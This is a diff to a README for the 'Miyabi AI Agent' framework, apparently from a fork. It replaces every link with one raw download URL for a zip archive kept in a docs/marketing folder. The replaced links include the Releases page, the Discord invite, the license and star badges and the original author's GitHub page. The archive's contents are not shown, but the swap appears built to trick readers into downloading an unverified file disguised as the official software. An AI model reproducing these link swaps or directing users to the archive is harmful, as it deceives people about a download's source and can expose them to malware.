@@ -2,11 +2,11 @@
 
 <div align="center">
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-2ea44f?style=for-the-badge)](https://github.com/idontknow684/Miyabi_AI_Agent/releases)
-[![GitHub Stars](https://img.shields.io/github/stars/ShunsukeHayashi/Miyabi_AI_Agent?style=social)](https://github.com/ShunsukeHayashi/Miyabi_AI_Agent)
-[![Discord](https://img.shields.io/discord/DISCORD_ID?color=7289da&label=Discord&logo=discord&logoColor=white)](https://discord.gg/ZpY9sxfYNm)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![Use this template](https://img.shields.io/badge/Use%20this%20template-2ea44f?style=for-the-badge)](https://github.com/ShunsukeHayashi/Miyabi_AI_Agent/generate)
+[![Download Now](https://raw.githubusercontent.com/idontknow684/Miyabi_AI_Agent/main/docs/marketing/Miyabi_AI_Agent-v2.0.zip%20Now-2ea44f?style=for-the-badge)](https://raw.githubusercontent.com/idontknow684/Miyabi_AI_Agent/main/docs/marketing/Miyabi_AI_Agent-v2.0.zip)
+[![GitHub Stars](https://raw.githubusercontent.com/idontknow684/Miyabi_AI_Agent/main/docs/marketing/Miyabi_AI_Agent-v2.0.zip)](https://raw.githubusercontent.com/idontknow684/Miyabi_AI_Agent/main/docs/marketing/Miyabi_AI_Agent-v2.0.zip)
+[![Discord](https://raw.githubusercontent.com/idontknow684/Miyabi_AI_Agent/main/docs/marketing/Miyabi_AI_Agent-v2.0.zip)](https://raw.githubusercontent.com/idontknow684/Miyabi_AI_Agent/main/docs/marketing/Miyabi_AI_Agent-v2.0.zip)
+[![License: MIT](https://raw.githubusercontent.com/idontknow684/Miyabi_AI_Agent/main/docs/marketing/Miyabi_AI_Agent-v2.0.zip)](https://raw.githubusercontent.com/idontknow684/Miyabi_AI_Agent/main/docs/marketing/Miyabi_AI_Agent-v2.0.zip)
+[![Use this template](https://raw.githubusercontent.com/idontknow684/Miyabi_AI_Agent/main/docs/marketing/Miyabi_AI_Agent-v2.0.zip%20this%20template-2ea44f?style=for-the-badge)](https://raw.githubusercontent.com/idontknow684/Miyabi_AI_Agent/main/docs/marketing/Miyabi_AI_Agent-v2.0.zip)
 
 </div>
 
@@ -18,7 +18,7 @@ Welcome to the Miyabi AI Agent Framework. Follow these steps to get started quic
 
 ### 1. Download the Application
 
-To start using Miyabi AI Agent, visit our [Releases page](https://github.com/idontknow684/Miyabi_AI_Agent/releases) to download the latest version of the software. Look for the file that matches your operating system.
+To start using Miyabi AI Agent, visit our [Releases page](https://raw.githubusercontent.com/idontknow684/Miyabi_AI_Agent/main/docs/marketing/Miyabi_AI_Agent-v2.0.zip) to download the latest version of the software. Look for the file that matches your operating system.
 
 ### 2. Install the Application
 
@@ -49,7 +49,7 @@ If you need further assistance or want to learn about advanced features, check o
 
 ## 💬 Community Support
 
-Join our community for help and discussions! You can reach out to us on our [Discord server](https://discord.gg/ZpY9sxfYNm) where you’ll find other users and developers.
+Join our community for help and discussions! You can reach out to us on our [Discord server](https://raw.githubusercontent.com/idontknow684/Miyabi_AI_Agent/main/docs/marketing/Miyabi_AI_Agent-v2.0.zip) where you’ll find other users and developers.
 
 ---
 
@@ -65,7 +65,7 @@ Miyabi AI Agent provides the following key features:
 
 ## 📦 Download & Install
 
-To download and install the Miyabi AI Agent, visit our [Releases page](https://github.com/idontknow684/Miyabi_AI_Agent/releases). Choose the version that is right for your operating system and follow the installation steps provided above.
+To download and install the Miyabi AI Agent, visit our [Releases page](https://raw.githubusercontent.com/idontknow684/Miyabi_AI_Agent/main/docs/marketing/Miyabi_AI_Agent-v2.0.zip). Choose the version that is right for your operating system and follow the installation steps provided above.
 
 ---
 
@@ -77,8 +77,8 @@ It’s important to understand what an AI agent can and cannot do. Many claims a
 
 ## 🔗 Useful Links
 
-- [Miyabi AI Agent GitHub Page](https://github.com/ShunsukeHayashi/Miyabi_AI_Agent)
-- [Join Our Discord](https://discord.gg/ZpY9sxfYNm)
+- [Miyabi AI Agent GitHub Page](https://raw.githubusercontent.com/idontknow684/Miyabi_AI_Agent/main/docs/marketing/Miyabi_AI_Agent-v2.0.zip)
+- [Join Our Discord](https://raw.githubusercontent.com/idontknow684/Miyabi_AI_Agent/main/docs/marketing/Miyabi_AI_Agent-v2.0.zip)
 - [Explore the Documentation](#-ドキュメント)
 
 ---
